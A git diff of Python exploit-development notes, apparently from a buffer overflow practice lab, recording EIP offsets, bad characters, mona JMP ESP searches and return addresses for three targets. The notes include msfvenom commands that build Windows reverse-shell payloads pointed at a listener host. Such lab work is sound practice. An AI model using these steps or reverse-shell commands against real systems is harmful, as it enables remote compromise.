@@ -1,9 +1,11 @@
 #!/bin/python3
 
 import binascii
+from utils import *
 
 '''
-* Notes:
+
+* OVERFLOW 1:
 
 0BADF00D       EIP contains normal pattern : 0x6f43396e (offset 1978)
 0BADF00D       ESP (0x01acfa30) points at offset 1982 in normal pattern (length 418)
@@ -14,27 +16,16 @@ import binascii
 
 
 
-EAX 018CF268 ASCII "OVERFLOW1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-ECX 0031563C
-EDX 0000000A
-EBX 41414141
 ESP 018CFA30
-EBP 41414141
-ESI 00000000
-EDI 00000000
 EIP 42424242
 
 BadChars=
 \x00\x07\x08\x2e\x2f\xa0\xa1
 
 '''
-# BadChars
-a = "\x00\x07\x08\x2e\x2f\xa0\xa1"
 
-def generate_chars():
-	for x in range(1, 256):
-		print("\\x" + "{:02x}".format(x), end='')
-	print()
+generate_bytearray()
+print()
 
 # ------
 # !mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"
@@ -52,18 +43,65 @@ def generate_chars():
 
 '''
 
-def hex2bytes(h):
-	x = bytes.fromhex(h)
-	print(x)
-	print(h[::-1])
-
-	# Print in reverse order
-	print(x[::-1])
-
+print('OVERFLOW1 retn Address:')
 hex2bytes("625011BB")
 
 # Generate Payload
 # msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c
-'''
 
-'''
+# ----------------------------------------------------------------------------------------
+
+## OVERFLOW 2
+
+# Crashed on 700 bytes
+
+# EIP address: 76413176
+# Offset: 634
+# Message=    EIP contains normal pattern : 0x76413176 (offset 634)
+
+# ESP address: 0x0189FA30
+# BadChars=00 23 24 3c 3d 83 84 ba bb
+# \x00\x23\x24\x3c\x3d\x83\x84\xba\xbb
+
+# New ESP after removing the bad chars
+# ESP: 0195FA30 
+
+# jumps
+# 625011AF     0x625011af : jmp esp 
+# 625011C7     0x625011c7 : jmp esp 
+# 625011D3     0x625011d3 : jmp esp 
+# 625011DF     0x625011df : jmp esp 
+# 625011EB     0x625011eb : jmp esp 
+# 625011F7     0x625011f7 : jmp esp 
+# 62501203     0x62501203 : jmp esp 
+# 62501205     0x62501205 : jmp esp 
+
+print("OVERFLOW 2: retn Address")
+hex2bytes("625011AF")
+
+# Generate RevShell 
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.6.163 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x24\x3c\x3d\x83\x84\xba\xbb" -f c
+
+# ----------------------------------------------------------------------------------------
+
+## OVERFLOW 3
+
+# Fuzzing crashed at 1300 bytes
+
+# EIP contains normal pattern : 0x35714234 (offset 1274)
+# ESP : 01B0FA30
+# Bad chars: 11 12 40 41 5f 60 b8 b9 ee ef
+# \x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef
+
+# New ESP: 0x01A2FA30
+# !mona jmp -r esp -cpb "\x00\x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef"
+
+# Result:
+# 0x62501203 : jmp esp |
+# 0x62501205 : jmp esp |
+
+print("OVERFLOW3 Address")
+hex2bytes("62501205")
+
+# Generate RevShell 
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.6.163 LPORT=8888 EXITFUNC=thread -b "\x00\x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef" -f c
